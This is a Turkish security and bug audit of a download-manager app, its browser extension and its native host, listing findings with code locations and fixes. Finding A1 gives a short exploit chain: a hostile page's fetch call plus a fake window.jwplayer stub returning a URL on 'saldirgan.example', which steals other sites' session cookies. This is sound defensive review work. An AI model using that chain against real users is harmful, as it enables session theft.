# 02 - App arayüzü, IPC, Native Host ve Eklenti: hata avı

Kapsam: `src\TDownloader.App\`, `src\TDownloader.Host\`, `src\TDownloader.Core\Ipc\`, `extension\`, `tests\TDownloader.Host.Tests`, `extension\tests`, `installer\*.ps1`.
Yöntem: yalnızca kod incelemesi. Hiçbir şey değiştirilmedi, uygulama/tarayıcı çalıştırılmadı. Bulgulardaki "kesin" = kodu açıp satırlarıyla doğruladım; "tahmin" = kodun gösterdiği ama çalıştırarak/üçüncü taraf kaynakla doğrulamadığım sonuç.
Satır numaraları dosyanın gerçek satırlarıdır (`cat -n` ile doğrulandı).

## Test sonuçları (bir kez çalıştırıldı)

| Komut | Sonuç |
|---|---|
| `dotnet build TDownloader.sln` | Başarılı, 0 uyarı, 0 hata |
| `dotnet test tests/TDownloader.Host.Tests` | 51 geçti, 0 başarısız, 0 atlandı |
| `node extension/tests/run.mjs` | 47 test geçti (exit 0) |

Not: Testler App (WinForms) formlarını, `VideoOverlayMediaSink`'i, `HlsClient` çerez davranışını, content/button script'lerinin sayfa ile etkileşimini ve MV3 service worker uyku/uyanmasını kapsamıyor; aşağıdaki bulguların çoğu tam bu boşluklarda.

## Özet

| Önem | Adet |
|---|---|
| Kritik | 1 |
| Yüksek | 3 |
| Orta | 11 |
| Düşük | 20 |
| Toplam | 35 |

Doğrulayıp sorun bulamadıklarım (kısa): eklenti kimliği `lgceenlgaaekpbeifoookmmkjipmcboc`, `manifest.json` `key` alanının SHA-256'sından türetilen değerle birebir aynı (`install-host.ps1` doğru). yt-dlp çağrılarında URL'den önce `--` var ve `ArgumentList` kullanılıyor (argüman enjeksiyonu yok). `button.js` içindeki `innerHTML` kullanımlarında tüm değişken içerik `esc()` ile kaçışlı. `externally_connectable` yok, `onMessageExternal` yok (başka eklenti/sayfa doğrudan mesaj atamaz). `MediaLog.Write` satır sonlarını temizliyor. Yakalama kapıları (`DownloadCaptureGate`) UI'a bağımlı değil ve bloklamıyor. Motor ilerleme nesneleri değişmez (immutable) olduğundan UI'da `Connections` yarışı yok.

---

## KRİTİK

### A1 - Sayfa kontrollü URL, başka sitenin çerezlerini (HttpOnly dahil) herhangi bir sunucuya gönderiyor
- **Durum:** Düzeltildi (eklenti da78eec, App 4fe46db; Core kısmı başka agent 48a66e2). Eklenti çerezi yalnızca yakalanan öğenin kendi URL'si için okur, players için okumaz; `qualities.cookieHosts` gönderir; App `MediaContext.CookieHost` doldurur, `ForSource` ile kaynak host'u uymayan bağlamdan çerezi atar.
- **Dosya:satır:** `extension/lib/media.js:46-59` (`cookiesForTab`), `extension/background.js:69`, `src/TDownloader.App/Services/VideoOverlayMediaSink.cs:470-471, 521, 533-539`, `src/TDownloader.Core/Video/HlsClient.cs:61, 124, 133` (ayrıca `MediaContext.cs:34`).
- **Sorun:** Düğmeye tıklanınca eklenti, sekmedeki TÜM medya öğelerinin origin'leri için `chrome.cookies.getAll` ile çerezleri toplayıp App'e yolluyor. App bu çerezleri origin'i eşleşen öğeye yazıyor (`MediaCookies.Apply`), sonra HLS bağlamı olarak `ContextOf(snap.Hls[0])` ile ilk (en yeni) HLS öğesinin çerezini alıyor (`ctx`). Sonra `GetInfoSetAsync(cands, ctx, ...)` bu `ctx` ile TÜM adaylara istek atıyor; adaylara `players` (sayfanın MAIN dünyasındaki jwplayer/video.js/script metninden okunan, sayfa tarafından tamamen belirlenen URL'ler) da ekleniyor. `HlsClient.GetTextAsync/GetLengthAsync` çerez koruması olarak `ctx.Apply(req, new Uri(url).Host)` çağırıyor: `cookieHost` isteğin kendi host'u olduğu için `MediaContext.Apply` içindeki "çerez yalnızca aynı sunucuya gider" denetimi her zaman doğru çıkıyor, yani koruma işlevsiz. Ayrıca `Cookie` başlığı elle eklendiği için yönlendirmelerde (HttpClient özel başlıkları korur) başka host'a da gider.
- **Nasıl tetiklenir (kod okumasıyla çıkarılan zincir, çalıştırılmadı):** Kötü niyetli sayfa (1) `fetch("https://hedef-site.example/?ext=m3u8", {mode:"no-cors"})` veya `<video src=...>` ile hedef sitede 200 dönen, `HLS_URL` regex'ine uyan (`?ext=m3u8`) bir istek yapar; `webRequest` bunu hedef origin'li bir "hls" öğesi olarak kaydeder (200 dönmesi yeter, çerezin isteğe gitmesi gerekmez: eklenti çerezleri `chrome.cookies.getAll` ile kendi okur, SameSite/HttpOnly fark etmez). (2) Sayfa `window.jwplayer = () => ({getPlaylist: () => [{file: "https://saldirgan.example/a.m3u8"}]})` tanımlar. (3) Videoya "Kaliteler" tıklanır (A2'ye göre kullanıcı etkileşimi bile gerekmez). App, hedef-site çerezini `Cookie:` başlığıyla `saldirgan.example/a.m3u8` isteğine ekler.
- **Önem:** Kritik (oturum çerezi çalınması, tüm siteler için).
- **Düzeltme:** `MediaContext.Apply`'da çerezi, çerezin ait olduğu origin'e bağla (`MediaContext`'e `CookieOrigin` ekle; istek host'u onunla karşılaştırılsın, `AllowAutoRedirect=false` + elle yönlendirmede çerez at); `players`/aday URL'leri çerezli bağlamla çekme. yt-dlp için de `Cookie` başlığını yalnızca kaynak host'una sınırla.
- **Kesin / tahmin:** Kod yolu kesin. Uçtan uca sömürü zinciri tahmin (çalıştırılmadı; hedef sitenin `?ext=m3u8`'e 200 dönmesi site bağımlı).

---

## YÜKSEK

### A2 - Sayfa betiği, sayfa içi düğmeyi sentetik olaylarla sürebilir (isTrusted denetimi yok, shadow root `open`)
- **Durum:** Düzeltildi (da78eec + 4fe46db). Shadow root closed; mousemove/click/menü/Esc/mousedown isTrusted ister; video düğmesinden gelen doğrudan indirme force:true ile her zaman onay penceresi gösterir.
- **Dosya:satır:** `extension/button.js:75` (`attachShadow({mode:"open"})`), `:208-218` (mousemove), `:265-271` (menü satırı tıklama), `:299-303` (düğme tıklama).
- **Sorun:** Düğme DOM'u sayfanın DOM'unda ve `host.shadowRoot` sayfadan erişilebilir; hiçbir olay işleyicisi `e.isTrusted` bakmıyor. Sayfa `mousemove` yollar, `#btn.click()` ve `.row` `click()` çağırır; böylece `qualities` isteği ve `qualitySelect` (App'te indirme penceresi) kullanıcı olmadan tetiklenir.
- **Tetikleme:** Sayfada ≥200x120 bir `<video>` + yukarıdaki sentetik olaylar. Sonuçlar: (a) A1 çerez sızıntısı sıfır etkileşimle çalışır; (b) App'te "Dosya İndirme Bilgisi" penceresi kendiliğinden açılır (`FileInfoDialog` `TopMost` + `Foreground.Force`, odağı çalar, `AcceptButton` Enter ile "İndirmeyi Başlat"; kullanıcı sayfada yazarken Enter basarsa indirme onaylanır); (c) kullanıcı "Seçenekler > Capture sonrası dosya bilgisini göster" ayarını kapattıysa (`MainForm.cs:647-651`: `ShowFileInfoOnCapture=false` iken `PromptDownloadAsync` pencere açmadan `_mgr.Add` yapar; `VideoOverlayMediaSink.DownloadDirect` bu yolu kullanır) sayfanın seçtiği URL sessizce diske indirilir.
- **Önem:** Yüksek.
- **Düzeltme:** Tıklama/mousemove işleyicilerinde `if (!e.isTrusted) return;`; shadow root'u `closed` yap ve `host`'u sayfa referansından sakla; `qualitySelect` yolundaki `PromptDownloadAsync`'e `force:true` (her zaman pencere) ver.
- **Kesin / tahmin:** Kod gerçeği kesin; (b)/(c) sonuçları tahmin (çalıştırılmadı).

### A3 - "Diskten Sil", Geri Dönüşüm Kutusu'na sığmayan dosyaları kalıcı silebilir
- **Durum:** Düzeltildi (4fe46db). SHFileOperation FOF_ALLOWUNDO|FOF_NOCONFIRMATION|FOF_WANTNUKEWARNING; reddedilen kalıcı silme "atlandı" diye bildirilir. Kabuk davranışı gerçek dosyayla çalıştırılarak DOĞRULANMADI (yalnızca sonuç yorumlama birim testli).
- **Dosya:satır:** `src/TDownloader.App/Forms/MainForm.cs:773`
- **Sorun:** `FileSystem.DeleteFile(path, UIOption.OnlyErrorDialogs, RecycleOption.SendToRecycleBin)`. VB çalışma zamanı `OnlyErrorDialogs`'ı `FOF_NOCONFIRMATION`'a eşliyor; kabuk, dosya kutu kapasitesini aşıyorsa (veya sürücüde çöp kutusu yoksa: ağ/çıkarılabilir sürücü) "kalıcı silinsin mi?" sorusuna sessizce "evet" der. Onay metni ise açıkça "Geri Dönüşüm Kutusu'na gönderilecek" diyor (`UiLogic.cs`, `DiskDeletePlan.ConfirmText`).
- **Tetikleme:** Çöp kutusu kapasitesinden büyük bir video (örn. 20 GB) veya D:/USB üzerindeki bir indirme için "Diskten Sil" > Evet; dosya kutuda bulunmaz.
- **Önem:** Yüksek (geri alınamaz veri kaybı; arayüz yanlış vaat ediyor).
- **Düzeltme:** `IFileOperation`/`SHFileOperation` ile `FOF_ALLOWUNDO | FOF_WANTNUKEWARNING` kullan (veya `UIOption.AllDialogs`); dosya kutuya gidemiyorsa kullanıcıya kalıcı silme uyarısı göster.
- **Kesin / tahmin:** Tahmin (VB `OnlyErrorDialogs` -> `FOF_NOCONFIRMATION` eşlemesi ve kabuk davranışı bilgiye dayanıyor; çalıştırılmadı).

### A4 - `TryClaimPrompt` tekilleştirmesi + "hemen accepted:true" birleşimi, indirmeyi sessizce yok edebilir
- **Durum:** Düzeltildi (4fe46db). `PromptClaims`: tekilleştirme bekleyen/açık pencere durumuyla, İptal'de talep hemen bırakılır; yalnızca eklenen indirme 15 sn hatırlanır. Test: ReviewFixTests (iptal sonrası yeniden sorulma).
- **Dosya:satır:** `src/TDownloader.App/Forms/MainForm.cs:627-645`, `src/TDownloader.Core/Ipc/DownloadCaptureGate.cs:31-52`, `extension/lib/capture.js:125-130`.
- **Sorun:** Kapı kural uygunsa hemen `accepted:true` dönüyor; eklenti buna güvenip tarayıcı indirmesini iptal edip siliyor (`capture.js:126-127`). App'te aynı URL için 15 sn'lik talep (claim) tutuluyor ve pencere kapanınca (İptal dahil) bırakılmıyor.
  1. Kullanıcı İptal der, 15 sn içinde aynı bağlantıya tekrar tıklar: kapı yine `accepted:true` döner, tarayıcı kopyası silinir, `PromptDownloadAsync` `false` döner, pencere açılmaz. Hiçbir şey inmez, geri bildirim yok.
  2. Pencere kuyruğunda (`_promptGate`) 15 sn'den uzun bekleyen aynı URL için tekrar yakalama gelirse talep süresi dolmuştur; ikinci pencere açılır (çift indirme riski).
- **Önem:** Yüksek ("hiç indirmeme" regresyonu; tam bu commit'in hedeflediği senaryonun yan etkisi).
- **Düzeltme:** Talebi pencere kapanınca bırak (veya pencere sonucu `Cancel` ise anında sil); tekilleştirmeyi "bekleyen/gösterilen" kümesiyle yap, zaman penceresiyle değil. Tekrar gelen istek için de kullanıcıya görünür bir şey göster.
- **Kesin / tahmin:** Kesin (kod akışı); senaryo 2 için kuyruk uzunluğu koşulu tahmin.

---

## ORTA

### A5 - Host, her tür mesajda (ping, media, tabClosed, qualitiesCancel) App'i yeniden başlatıyor: kullanıcı App'ten "Çıkış" yapamıyor
- **Durum:** Düzeltildi (e26ecf6). Yalnızca download/qualities App'i başlatır. Test: sahte exe ile ping/media/tabClosed/... başlatmaz.
- **Dosya:satır:** `src/TDownloader.Host/HostRunner.cs:64` (`EnsureConnectedAsync`), `:104` (`TryLaunchApp`), `:125-143`; test onayı: `tests/TDownloader.Host.Tests/HostProcessTests.cs:107` (ping için de başlatma deneniyor).
- **Sorun:** Bağlantı yoksa herhangi bir tarayıcı mesajı App'i `--background` ile başlatıyor. Eklenti her sayfada `media`/`tabClosed` yolluyor (`media.js:133,151`, `background.js` `tabs.onRemoved`), popup `ping` yolluyor.
- **Tetikleme:** Tepsiden "Çıkış"; ardından herhangi bir sekmeyi kapatmak/video içeren sayfa açmak App'i saniyeler içinde gizli olarak geri getirir. Yalnızca `download` için başlatma mantıklı.
- **Önem:** Orta.
- **Düzeltme:** App başlatmayı yalnızca `DownloadMessage` (ve gerekirse `QualitiesMessage`) için yap; diğerlerinde bağlıysa ilet, değilse düşür.
- **Kesin / tahmin:** Kesin.

### A6 - App'e ulaşılamayınca `qualities` isteğine yanıt verilmiyor: menü 100 sn "Kaliteler okunuyor" döner
- **Durum:** Düzeltildi (e26ecf6). App yoksa qualities'e hemen ok:false yanıt.
- **Dosya:satır:** `src/TDownloader.Host/HostRunner.cs:80-84` (yalnızca `DownloadMessage` için hata yanıtı), `extension/button.js:296` (100 sn zaman aşımı), `extension/background.js:72-73` (100000 ms).
- **Sorun:** App kapalı/başlatılamıyorsa Host `qualities` mesajını sessizce düşürüyor; kullanıcı 100 sn spin görür. `qualitySelect` düşürüldüğünde de "✓ gönderildi" gösterilir (A8'ye bakın).
- **Önem:** Orta.
- **Düzeltme:** Host, `QualitiesMessage` için hemen `QualitiesResultMessage(ok:false, errorCode:"silent"/"error")` dönsün; eklenti `native.request` null dönünce zaten "yanıt vermedi" gösteriyor.
- **Kesin / tahmin:** Kesin.

### A7 - Named pipe: kabul döngüsü `UnauthorizedAccessException` ile sessizce ölüyor; pipe adı makine genelinde, `CurrentUserOnly` yok
- **Durum:** Düzeltildi (e26ecf6): PipeOptions.CurrentUserOnly (sunucu+istemci), kabul döngüsü tüm istisnalarda sürer. Atlanan: pipe adına SID eklenmedi (sürüm uyumsuzluğu riski); başka kullanıcı oturumunda davranış çalıştırılarak doğrulanmadı.
- **Dosya:satır:** `src/TDownloader.Core/Ipc/IpcPipe.cs:95-96` (sunucu), `:102-103` (yalnızca `OperationCanceledException` ve `IOException` yakalanıyor), `:189` (istemci, kimlik doğrulaması yok).
- **Sorun:** (1) Aynı makinede ikinci bir kullanıcı oturumu (hızlı kullanıcı değiştirme/RDP) App açarsa `Local\` mutex oturum başınadır ama pipe adı `\\.\pipe\TDownloader.Ipc` küreseldir; `new NamedPipeServerStream` erişim reddiyle `UnauthorizedAccessException` atar, döngü ölür (görev hatası gözlenmez), günlük yok: IPC sessizce çalışmaz. (2) Host sunucunun kimliğini doğrulamıyor; başka bir kullanıcı/süreç pipe'ı önceden oluşturursa Host `download` mesajlarını (URL, referrer, çerezler) ona yollar.
- **Önem:** Orta (tek kullanıcılı masaüstünde etkisi düşük; çok kullanıcılı makinede çerez ifşası).
- **Düzeltme:** Sunucuda `PipeOptions.CurrentUserOnly`, istemcide aynı seçenek; pipe adına kullanıcı SID/adı ekle; kabul döngüsünde tüm istisnaları yakalayıp günlüğe yaz ve yeniden dene.
- **Kesin / tahmin:** `catch` boşluğu kesin; DACL/başka-kullanıcı davranışı tahmin.

### A8 - `media` öğeleri bağlantı yokken sessizce kayboluyor; yeniden bağlanınca yeniden gönderilmiyor
- **Durum:** Düzeltildi (da78eec). Gönderilemeyen medya "gönderilmiş" sayılmaz; App bağlanınca (settings mesajı) tüm sekmeler yeniden gönderilir; qualitySelect gönderilemediyse düğme hata gösterir.
- **Dosya:satır:** `extension/lib/media.js:131-133`, `extension/lib/native.js:48-52` (`send` false dönebilir), `extension/background.js:83-85` (`qualitySelect` sonucu yok sayılıyor).
- **Sorun:** `flush` önce `g.fresh.clear()` yapıyor, sonra `native.send` sonucunu yok sayıyor. Port yoksa/yazılamazsa öğeler `g.items` içinde "gönderilmiş" sayılır; aynı URL tekrar görülse `g.items.has` nedeniyle yeniden eklenmez. Host yeniden başlayınca (veya App sonradan açılınca) App'in listesi eksik kalır. `qualitySelect` da bağlantı koptuysa kaybolur ama düğme "✓ T-Downloader'a gönderildi" gösterir.
- **Tetikleme:** Tarayıcı/sayfa açıkken App'i başlatmak; video sayfası zaten yüklü, düğme boş/eksik liste ile çalışır (yt-dlp yoksa "bulunamadı").
- **Önem:** Orta.
- **Düzeltme:** Gönderim başarısızsa `fresh`'i temizleme; port `onConnect`'inde tüm aktif sekme gruplarını `append:false` ile yeniden yolla; `qualitySelect` için `send` sonucuna göre yanıt (`ok:false`) dön ve düğme hata göstersin.
- **Kesin / tahmin:** Kesin (kod); sahne tahmin.

### A9 - MV3 service worker uyuyup uyanınca (veya sayfa yenilenince) App'te eski sayfanın medyası kalıyor
- **Durum:** Düzeltildi (da78eec). tabs.onUpdated status=loading (adres değişmese de) her zaman tabClosed gönderir. Atlanan: webNavigation izni eklenmedi (izin artışı eklentiyi devre dışı bırakabilir); App'te PageUrl değişimine göre temizleme yok.
- **Dosya:satır:** `extension/lib/media.js:149-151` (`clearTab`: boş liste yalnızca bellekte `g.items.size>0` olan gruplar için), `extension/background.js:48-49` (`change.status==="loading" && change.url`).
- **Sorun:** (a) SW 30 sn boşta kalıp sonlanınca `groups` Map'i kaybolur; sonraki navigasyonda `clearTab` hiçbir grup bulamaz ve App'e temizleme mesajı gitmez, App'te (`TabState.Frames`) eski sayfanın HLS/dosyaları kalır. App tarafı `PageUrl` değişimine göre temizlemiyor (`VideoOverlayMediaSink.OnMedia`, `Resolve`). (b) Aynı URL ile yenileme (F5) için `changeInfo.url` gelmez (url değişmediğinden); `clearTab` hiç çağrılmaz, eski imzalı/süresi dolmuş URL'ler listede kalır.
- **Önem:** Orta (yanlış videoyu/süresi dolmuş akışı listeler).
- **Düzeltme:** Temizlemeyi `status==="loading"` ve (url değiştiyse VEYA `frameId 0` yeni belge) koşuluyla yap; `tabs.onUpdated` yanında `webNavigation.onCommitted` (frameId 0) kullan; App'e `tabId` bazlı "sıfırla" mesajı gönder (`append:false` + boş) SW belleğine bağımlı olmadan.
- **Kesin / tahmin:** (a) kesin (kod); (b) `changeInfo.url` davranışı Chrome belgelerine dayalı tahmin.

### A10 - Düğme, tıklanan videoyu değil "en yeni akışı" listeliyor (yanlış videoya bağlanma)
- **Durum:** Atlandı: gerçek çözüm tıklanan <video> ile akış zamanlamasını eşleştirmeyi gerektirir (tasarım değişikliği, riskli).
- **Dosya:satır:** `extension/button.js:280-297` (yalnızca `currentSrc/src` gönderir; MSE/`blob:` için boş), `src/TDownloader.App/Services/VideoOverlayMediaSink.cs:274-281, 479-483, 532-535`.
- **Sorun:** `src` boş ise (YouTube/MSE gibi blob kullanan oynatıcılar) App, çerçevedeki (yoksa sekmedeki) HLS öğelerini "en yeni önce" sıralayıp `cands[0]`'ı seçiyor. Aynı çerçevede iki video/oynatıcı varsa (akış sayfaları, sonraki-video önbellekleme) tıklanan video ile menüdeki kaliteler uyuşmayabilir.
- **Önem:** Orta.
- **Düzeltme:** Düğme tıklanınca hangi `<video>`'nun tıklandığını (örn. çerçeve içi indeks + son 5 sn içinde başlayan istek zamanı) gönder; App eşleşen akışı öne alsın.
- **Kesin / tahmin:** Kod davranışı kesin; gerçek sitelerde sıklığı tahmin.

### A11 - Çerezler yt-dlp komut satırında, günlükte imza/URL sızabilir
- **Durum:** Kısmen (4fe46db): günlüğe yazılan hata/yt-dlp metinlerindeki URL'ler `MediaContexts.Scrub` ile host+yola indirilir. Çerezin komut satırında görünmesi Core agent'ı tarafından giderildi (48a66e2, geçici Netscape dosyası).
- **Dosya:satır:** `src/TDownloader.Core/Video/YtDlpClient.cs:45` (`--add-header Cookie:...` komut satırı argümanı), `src/TDownloader.App/Services/VideoOverlayMediaSink.cs:549, 620` (`ex.Message`/`error` ham yazılıyor), `Core/Util/MediaLog.cs:9` (başlıkta "Çerez/imza/token ASLA yazılmaz").
- **Sorun:** (1) Komut satırı argümanları aynı kullanıcının başka süreçlerince (Görev Yöneticisi/WMI/EDR) okunabilir; oturum çerezi orada görünür. (2) `YtDlpParsing.MapError` son `ERROR:` satırını (300 karaktere kadar) olduğu gibi döndürür; yt-dlp hata satırları imzalı URL içerir (örn. `https://cdn/...?sig=...`). Bu metin `RESULT fail ... err=` satırlarına yazılıyor, oysa `Sanitize` yalnızca URL alanlarına uygulanıyor.
- **Önem:** Orta.
- **Düzeltme:** Çerezi `--cookies` dosyasına (Netscape biçimi, geçici dosya, hemen sil) veya stdin üzerinden ver; günlüğe yazılan serbest metinlerden URL'leri `Sanitize` ile temizle.
- **Kesin / tahmin:** (1) kesin; (2) tahmin (yt-dlp çıktısı çalıştırılmadı).

### A12 - Gizli pencere (incognito) indirmeleri de yakalanıyor; çerezler yanlış depodan alınıyor
- **Durum:** Düzeltildi (da78eec): gizli pencere indirmeleri yakalanmaz (tarayıcıda kalır). Atlanan: storeId ile çerez deposu seçimi (yakalama kapatıldığı için gereksiz).
- **Dosya:satır:** `extension/lib/capture.js:103-131` (`item.incognito` hiç denetlenmiyor), `:24-29` (`chrome.cookies.getAll({url})`, `storeId` yok).
- **Sorun:** Eklenti gizli modda etkinse, gizli pencere indirmesi App'e gider; `getAll` varsayılan (normal profil) çerez deposunu okur, gizli oturumun çerezlerini değil (indirme 403 olabilir); indirme URL'si/dosya adı `downloads.json`'a kalıcı olarak yazılır (gizlilik).
- **Önem:** Orta (gizlilik + yanlış çerez).
- **Düzeltme:** `item.incognito` ise yakalama (veya kullanıcıya sor); yakalanacaksa `chrome.cookies.getAllCookieStores` ile doğru `storeId` kullan.
- **Kesin / tahmin:** Kesin (kod); yalnızca eklenti gizli modda izinliyse geçerli.

### A13 - App kapanırsa/çökerse bekleyen onay pencereleri ve tarayıcı kopyası kayboluyor
- **Durum:** Kısmen (4fe46db): kullanıcı Çıkış derken onay bekleyen pencere varsa uyarı. Atlanan: pending.json ile kalıcılık/yeniden sunma (tasarım değişikliği).
- **Dosya:satır:** `extension/lib/capture.js:125-127` (accepted -> cancel+erase), `src/TDownloader.Core/Ipc/DownloadCaptureGate.cs:46-51` (bekleyenler yalnızca bellekte).
- **Sorun:** `accepted:true` sonrası tarayıcı indirmesi silinir; onay penceresi kuyruğundaki istekler (en çok 500) App çıkışı/çökmesi/`ExitApp` ile yok olur. Kullanıcı hiçbir uyarı almaz.
- **Önem:** Orta (tasarım riski: IDM tarzı akışın bedeli).
- **Düzeltme:** Bekleyen istekleri `pending.json`'a yaz ve açılışta yeniden sun; veya çıkışta bekleyen onay varsa uyar.
- **Kesin / tahmin:** Kesin (kod); olasılık tahmin.

### A14 - Birleştirme/ffmpeg aşaması (`Phase`) arayüzde hiç gösterilmiyor
- **Durum:** Düzeltildi (4fe46db): FillRow durum sütununda p.Phase gösterilir.
- **Dosya:satır:** `src/TDownloader.Core/Queue/DownloadManager.cs:397-402` (`Phase = p.Phase` yayınlanıyor); `src/TDownloader.App` içinde `Phase` kullanımı yok (grep: 0 eşleşme); `MainForm.cs:457-469` (`StatusText`).
- **Sorun:** Son commit'lerde eklenen "Birleştiriliyor %40" ilerlemesi (5f5240e) UI'ya bağlanmamış. HLS/yt-dlp indirmeleri %100'de uzun süre "Alınıyor" gibi takılı görünür.
- **Önem:** Orta (kullanıcı takıldı sanıp iptal eder).
- **Düzeltme:** `Flush`/`FillRow` içinde `p.Phase` doluysa durum sütununa yaz.
- **Kesin / tahmin:** Kesin.

### A15 - `qualitiesCancel` yarışları: iptal gelmeden önce kayıt yok, iş sürer
- **Durum:** Düzeltildi (da78eec + 4fe46db): kimlik await'ten önce izlenir; App erken gelen iptali saklar; CancelRunning kaydı silmez, Cts finally'de dispose edilir.
- **Dosya:satır:** `extension/background.js:69-71` (`qlist.track` yalnızca `probePlayers` (en çok 1,5 sn) + `cookiesForTab` bittikten sonra), `extension/lib/qualities.js:28-33` (`cancel` kayıtsız kimlik için `false`), `src/TDownloader.App/Services/IpcCoordinator.cs:46` + `VideoOverlayMediaSink.cs:462-467` (App'te `Task.Run` -> `Post` gecikmesi, `Cancel` önce `Post`'lanabilir).
- **Sorun:** Menü ilk ~1,5 sn içinde kapanırsa eklenti `qualitiesCancel` yollamaz (kimlik henüz izlenmiyor) ve istek yine de gönderilir; App'te iptal, kayıt oluşmadan işlenirse yt-dlp/HLS işi tamamlanana dek çalışır. Ayrıca `CancelRunning` sonrası `r.Cts` `Dispose` edilmiyor (`:99-102`, `finally`'de `Remove` null döner).
- **Önem:** Orta-Düşük (kaynak israfı; yt-dlp süreci bekler).
- **Düzeltme:** Kimliği `qualities` mesajı gelir gelmez (await'ten önce) izle; App'te iptali kimlik bazlı "iptal edildi" kümesine yaz ve `GetQualitiesAsync` başında bak.
- **Kesin / tahmin:** Kesin (kod); pencere çok dar.

---

## DÜŞÜK

### A16 - `content.js`: alt çerçeve konumu `postMessage(..., "*")` ile sayfa adresi/başlığı sızdırır; gelen mesaj origin doğrulamasız
- **Durum:** Atlandı (düşük; davranış değişikliği gerektirir).
- **Dosya:satır:** `extension/content.js:134`, `:73-79` (`onChildMessage`), `:98-103`.
- **Sorun:** `nativeButton` açıkken her iç çerçeve `pageUrl` ve `pageTitle` ile birlikte payload'ı üst çerçeveye `*` ile yollar; çapraz-origin üst sayfa iç çerçevenin tam URL'sini/başlığını öğrenir. Üst çerçeve de `e.origin` bakmadan herhangi bir iç çerçevenin `__tdGeo` payload'ını kabul eder (en çok 20 kaynak; rect sahtelenebilir, yalnızca düğme konumunu etkiler).
- **Önem:** Düşük (`nativeButton` varsayılan kapalı).
- **Düzeltme:** Payload'dan `pageUrl/pageTitle`'ı çıkar (üst çerçeve kendi bilir); `targetOrigin` olarak `location.ancestorOrigins[0]` kullan.
- **Kesin / tahmin:** Kesin.

### A17 - Alt tuşu yakalamayı atlama: sentetik olaylarla sayfa kapatabilir, durum tüm sekmeler için küresel
- **Durum:** Düzeltildi (da78eec): Alt tuşu/tıklama/blur işleyicileri isTrusted ister. Atlanan: durumun sekme bazlı tutulması.
- **Dosya:satır:** `extension/content.js:143-150`, `extension/lib/capture.js:9-10` (`altUntil` küresel).
- **Sorun:** `keydown{key:"Alt"}` / `click{altKey:true}` için `isTrusted` denetimi yok; herhangi bir sayfa/iframe 10 sn boyunca tüm tarayıcının indirme yakalamasını kapatabilir. `blur` olayı da başka çerçeveden `alt(0)` yollayıp kullanıcının basılı Alt'ını sıfırlayabilir.
- **Önem:** Düşük.
- **Düzeltme:** `e.isTrusted` iste; durumu `sender.tab.id` bazında tut.
- **Kesin / tahmin:** Kesin.

### A18 - Eklenti parmak izi: `web_accessible_resources` `<all_urls>`, sabit kimlik
- **Durum:** Atlandı (düşük; simgeyi gömmek ve manifest değiştirmek gerekir).
- **Dosya:satır:** `extension/manifest.json` (`web_accessible_resources`: `icons/icon32.png`, `matches: <all_urls>`; `key` ile sabit kimlik), `button.js:71`.
- **Sorun:** Her site `chrome-extension://lgceenlgaaekpbeifoookmmkjipmcboc/icons/icon32.png` yükleyerek eklentinin kurulu olup olmadığını anlayabilir.
- **Önem:** Düşük.
- **Düzeltme:** Simgeyi veri URI'si olarak `button.js`'e göm; `web_accessible_resources`'u kaldır.
- **Kesin / tahmin:** Kesin.

### A19 - Sağ tık menüsü yolu: zaman aşımında çift indirme; `ftp:` için tarayıcıya düşme
- **Durum:** Kısmen (0fcbb55): ftp: menüden/link toplamadan çıkarıldı. Atlanan: zaman aşımında çift indirme (lateWatch kaydı).
- **Dosya:satır:** `extension/lib/menus.js:20-29` (`sendDownload` `browserId` vermiyor, `lateWatch` kayıtsız), `src/TDownloader.Core/Ipc/DownloadCaptureGate.cs:21-23` (`IsHttp` yalnızca http/https), `menus.js:21` (`ftp:` kabul ediliyor).
- **Sorun:** App >15 sn gecikirse (soğuk başlangıç) eklenti `chrome.downloads.download` ile tarayıcıdan indirir; App geç `accepted:true` dönünce ikinci indirme açılır (iptal edilecek tarayıcı kimliği yok). `ftp:` URL'leri App'te reddedilir, modern Chrome ftp desteklemediğinden indirme kaybolur.
- **Önem:** Düşük.
- **Düzeltme:** Menü yolunda zaman aşımını yalnızca "App yok" ile sınırla ve fallback sonrası `lateWatch` kaydı tut; `ftp:`'yi menüden çıkar.
- **Kesin / tahmin:** Kesin (kod); 15 sn koşulu nadir.

### A20 - "Tüm linkleri indir": en çok 500 ardışık onay penceresi, toplu iptal yok
- **Durum:** Atlandı (UX, tasarım gerektirir).
- **Dosya:satır:** `extension/lib/menus.js:49`, `DownloadCaptureGate.cs:20` (`MaxPending=500`).
- **Sorun:** Link sayısı kadar pencere sırayla açılır; "hepsini iptal et" yok, kullanıcı App'i kapatmadan kurtulamaz.
- **Önem:** Düşük (UX).
- **Düzeltme:** Toplu istekleri tek "çoklu link" penceresinde göster.
- **Kesin / tahmin:** Kesin.

### A21 - "Kalan süreye göre" sıralama çalışmıyor
- **Durum:** Atlandı (Cmp'e ilerleme verisi taşımak gerekir; riskli değil ama 1-2 satır değil).
- **Dosya:satır:** `src/TDownloader.App/Forms/MainForm.cs:565-575` (`Cmp`: `"eta"` anahtarı yok, `default` -> `AddedAt`), `:223-228`.
- **Sorun:** Menüdeki "Kalan süreye göre" ve "K" sütunu aslında eklenme/durum sırasına göre sıralar.
- **Önem:** Düşük.
- **Düzeltme:** `"eta"` için `p.Eta` (progress'ten) karşılaştırması ekle ya da menü öğesini kaldır.
- **Kesin / tahmin:** Kesin.

### A22 - HLS kalite çözümü iptal edilemiyor (belirteç yok sayılıyor)
- **Durum:** Düzeltildi (4fe46db): ct GetInfoSetAsync'e geçirilir.
- **Dosya:satır:** `VideoOverlayMediaSink.cs:539` (`_ => _hls.GetInfoSetAsync(...)`; `ct` verilmiyor).
- **Sorun:** `SharedTaskCache` bekleyen kalmayınca `Cts.Cancel()` çağırır ama fabrika `ct`'yi kullanmaz; her aday için 20 sn'ye kadar ağ isteği sürer. Menü hızlı açılıp kapanınca arka planda istek birikir.
- **Önem:** Düşük.
- **Düzeltme:** `ct`'yi `GetInfoSetAsync`'e geçir.
- **Kesin / tahmin:** Kesin.

### A23 - İstemci kopunca sürmekte olan kalite işleri iptal edilmiyor; yayın (broadcast) baştan sona sıralı
- **Durum:** Atlandı (düşük).
- **Dosya:satır:** `IpcPipe.cs:150-159` (`BroadcastAsync` ardışık; tıkanan bağlantı diğerlerini bekletir, iptal edilemeyen yazma), `:133` (`ClientDisconnected` hiçbir yerde dinlenmiyor).
- **Sorun:** Host kapanınca ona ait `_running` işleri (yt-dlp) sonuçlanana kadar sürer; bir bağlantı okumazsa (Host stdout'ta tıkandı) `settings`/`hideButton` yayını tüm istemciler için takılır.
- **Önem:** Düşük.
